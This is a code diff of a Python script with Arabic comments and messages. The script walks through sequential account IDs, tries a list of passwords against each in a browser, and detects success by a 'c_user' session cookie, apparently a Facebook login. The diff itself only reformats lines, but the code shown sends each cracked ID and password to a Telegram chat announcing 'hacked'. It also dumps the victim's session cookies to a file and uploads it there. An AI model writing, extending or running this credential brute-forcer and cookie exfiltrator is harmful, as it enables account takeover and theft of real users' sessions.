@@ -27,8 +27,10 @@ def run_scanner():
     while True:
         # إشعار كل 5 معرفات للتأكد من الحالة
         if current_id % 5 == 0:
-            try: bot.send_message(CHAT_ID, f"📡 السكربت لا يزال يعمل.. واصل لفحص: {current_id}")
-            except: pass
+            try: 
+                bot.send_message(CHAT_ID, f"📡 السكربت لا يزال يعمل.. واصل لفحص: {current_id}")
+            except: 
+                pass
             
         for password in PASSWORDS:
             print(f"Checking: {current_id} Pass: {password}")
@@ -50,12 +52,16 @@ def run_scanner():
                 all_cookies = driver.get_cookies()
                 if any(c['name'] == 'c_user' for c in all_cookies):
                     bot.send_message(CHAT_ID, f"🔥 تم الاختراق!\n🆔 {current_id}\n🔑 {password}")
-                    with open(f"{current_id}.json", "w") as f: json.dump(all_cookies, f)
-                    with open(f"{current_id}.json", "rb") as f: bot.send_document(CHAT_ID, f)
+                    with open(f"{current_id}.json", "w") as f: 
+                        json.dump(all_cookies, f)
+                    with open(f"{current_id}.json", "rb") as f: 
+                        bot.send_document(CHAT_ID, f)
                     os.remove(f"{current_id}.json")
                     break
-            except: pass
-            finally: driver.quit()
+            except: 
+                pass
+            finally: 
+                driver.quit()
         
         current_id += 1
         time.sleep(1)
